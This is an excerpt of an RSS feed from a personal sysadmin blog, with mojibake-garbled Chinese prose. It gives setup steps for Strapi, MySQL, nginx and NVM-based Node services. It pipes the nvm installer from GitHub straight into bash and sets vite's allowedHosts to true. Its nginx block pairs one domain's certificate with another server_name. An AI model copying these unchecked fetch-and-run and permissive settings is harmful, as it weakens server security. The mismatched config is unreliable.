&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;port&amp;gt;4430&amp;lt;/port&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;althostnames&amp;gt;192.168.100.2&amp;lt;/althostnames&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/webgui&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;......
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åé‡å¯webgui&lt;/p&gt;</description>
    </item>
    <item>
      <title>strapiçš„å®‰è£…</title>
      <link>https://rendoumi.com/posts/20251016-strapi/</link>
      <pubDate>Thu, 16 Oct 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251016-strapi/</guid>
      <description>&lt;p&gt;è€å®è¯´ï¼Œstrapiçš„å®‰è£…çœŸçš„ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹æƒ…ã€‚&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€æ­¥æƒ³ç®€å•åŒ–ï¼Œäºæ˜¯å°±ç”¨Docker composeæ¥å®‰è£…ï¼Œç»“æœå¹¶ä¸å®¹æ˜“ï¼Œå®˜æ–¹æ–‡æ¡£ä¸å¯ç”¨ï¼Œæ”¹äº†åŠå¤©ç»ˆäºè·‘èµ·æ¥ï¼Œç„¶åï¼Œå˜¿å˜¿ï¼Œdockerhubä¸Šçš„strapi:latest æ—©å°±è¿‡æœŸå¾ˆä¹…äº†ã€‚&lt;/p&gt;
&lt;p&gt;äºæ˜¯åˆç¢ç£¨å®ƒé‚£ä¸ªDocker buildç‰ˆæœ¬çš„ï¼Œé—®é¢˜æ˜¯ï¼Œéƒ½åœ¨å®¿ä¸»æœºç¯å¢ƒbuildå‡ºæ¥äº†ï¼Œç„¶åå†æ”¾åˆ°Dockeré•œåƒä¸­è·‘ï¼Œå²‚ä¸æ˜¯è„±è£¤å­æ”¾å±ï¼Œå¤šæ­¤ä¸€ä¸¾ä¹ˆã€‚&lt;/p&gt;
&lt;p&gt;äºæ˜¯å›åˆ°åŸç‚¹ï¼Œéœ€è¦åœ¨CLIç¯å¢ƒä¸‹å®‰è£…ï¼Œç„¶åè¦éƒ¨ç½²åˆ°æ­£å¼ç”Ÿäº§ç¯å¢ƒã€‚&lt;/p&gt;
&lt;p&gt;æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h5 id=&#34;ä¸€è£…mysql-80&#34;&gt;ä¸€ã€è£…mysql 8.0&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install wget lsb-release gnupg -y
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://dev.mysql.com/get/mysql-apt-config_0.8.29-1_all.deb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dpkg -i mysql-apt-config_0.8.29-1_all.deb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install mysql-server
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;äºŒè£…nvmnodejså’Œyarn&#34;&gt;äºŒã€è£…NVMï¼Œnodejså’Œyarn&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.4/install.sh &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bash
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; ~/.nvm/nvm.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm ls-remote
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm install v20.19.5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;node -v
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm install -g yarn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm list -g
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;ä¸‰åˆå§‹åŒ–strapi&#34;&gt;ä¸‰ã€åˆå§‹åŒ–strapi&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /data
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /data
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yarn create strapi
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æˆ‘ä»¬è¦è·³è¿‡å®ƒé‚£ä¸ªå…è´¹30å¤©çš„growæ–¹æ¡ˆ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç„¶åæ•°æ®åº“æ˜¯ mysql , å¡«å…¥mysqlçš„ä¸€ç³»åˆ—å‚æ•°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ä½¿ç”¨ts&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;å››é…ç½®strapi&#34;&gt;å››ã€é…ç½®strapi&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# åŠ å…¥è‡ªå·±çš„åŸŸå&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /data/strapi/config/server.ts
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; default &lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; env &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  host: env&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HOST&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  port: env.int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PORT&amp;#39;&lt;/span&gt;, 1337&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  url: &lt;span class=&#34;s1&#34;&gt;&amp;#39;https://blog.rendoumi.com&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  app: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    keys: env.array&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;APP_KEYS&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å»ºç«‹æ–°æ–‡ä»¶&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /data/strapi/src/admin/vite.config.ts
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; defineConfig, mergeConfig &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; from &lt;span class=&#34;s1&#34;&gt;&amp;#39;vite&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; default &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;config&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; mergeConfig&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;config, defineConfig&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    resolve: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      alias: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;@&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;/src&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    server: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      allowedHosts: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;äº”å®‰è£…nginxè¿è¡Œç¨‹åº&#34;&gt;äº”ã€å®‰è£…nginxï¼Œè¿è¡Œç¨‹åº&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ³¨é‡Šæ‰æ— ç”¨é…ç½®&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/nginx/nginx.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#        include /etc/nginx/sites-enabled/*;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ–°å¢é…ç½®&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/nginx/conf.d/strapi.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;upstream strapi &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    server 127.0.0.1:1337&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# Listen HTTP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    listen 80&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    server_name blog.rendoumi.com&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# Redirect HTTP to HTTPS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; https://&lt;span class=&#34;nv&#34;&gt;$host$request_uri&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# Listen HTTPS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    listen &lt;span class=&#34;m&#34;&gt;443&lt;/span&gt; ssl&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    server_name webcms.yoov.com&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# SSL config&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ssl_certificate /usr/local/bin/certs/certificates/blog.rendoumi.com.crt&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ssl_certificate_key /usr/local/bin/certs/certificates/blog.rendoumi.com.key&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# Proxy Config&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    location / &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_pass http://strapi&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_http_version 1.1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_set_header X-Forwarded-Host &lt;span class=&#34;nv&#34;&gt;$host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_set_header X-Forwarded-Server &lt;span class=&#34;nv&#34;&gt;$host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_set_header X-Real-IP &lt;span class=&#34;nv&#34;&gt;$remote_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_set_header X-Forwarded-For &lt;span class=&#34;nv&#34;&gt;$proxy_add_x_forwarded_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_set_header X-Forwarded-Proto &lt;span class=&#34;nv&#34;&gt;$scheme&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_set_header Host &lt;span class=&#34;nv&#34;&gt;$http_host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_set_header Upgrade &lt;span class=&#34;nv&#34;&gt;$http_upgrade&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_set_header Connection &lt;span class=&#34;s2&#34;&gt;&amp;#34;Upgrade&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_pass_request_headers on&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /data/strapi
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yarn develop
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åç™»å½•å°±å¯ä»¥äº†ï¼Œè¯¡å¼‚çš„æ˜¯ç¬¬å››æ­¥ï¼Œå¦‚æœä¸gen vite.config.tsï¼Œé‚£nginxä»£ç†è®¿é—®local host:1337ä¸Šä¼šå‡ºé—®é¢˜ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>NVMç®¡ç†çš„Nodejså¦‚ä½•åšæˆsystemdçš„serivceæœåŠ¡</title>
      <link>https://rendoumi.com/posts/20251015-nodejs_systemctl/</link>
      <pubDate>Wed, 15 Oct 2025 09:10:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251015-nodejs_systemctl/</guid>
      <description>&lt;p&gt;æœ‰å¾ˆå¤šnextã€nuxtã€yarnçš„nodejsç¨‹åºï¼Œéƒ½æ˜¯ä»€ä¹ˆ&lt;code&gt;npm start&lt;/code&gt;æˆ–è€…&lt;code&gt;yarn develop&lt;/code&gt;çš„å¯åŠ¨æ¨¡å¼ï¼Œå¦‚ä½•ææˆsystemdçš„æœåŠ¡å‘¢ï¼Œè¿™é‡Œé¢éº»çƒ¦çš„å°±æ˜¯systemdçš„æœåŠ¡éœ€è¦ä½¿ç”¨å…¨è·¯å¾„ã€‚&lt;/p&gt;
&lt;p&gt;é‚£æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h5 id=&#34;ä¸€å®‰è£…nvm&#34;&gt;ä¸€ã€å®‰è£…nvm&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.4/install.sh &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;äºŒå®‰è£…nodejså’Œyarn&#34;&gt;äºŒã€å®‰è£…nodejså’Œyarn&lt;/h5&gt;
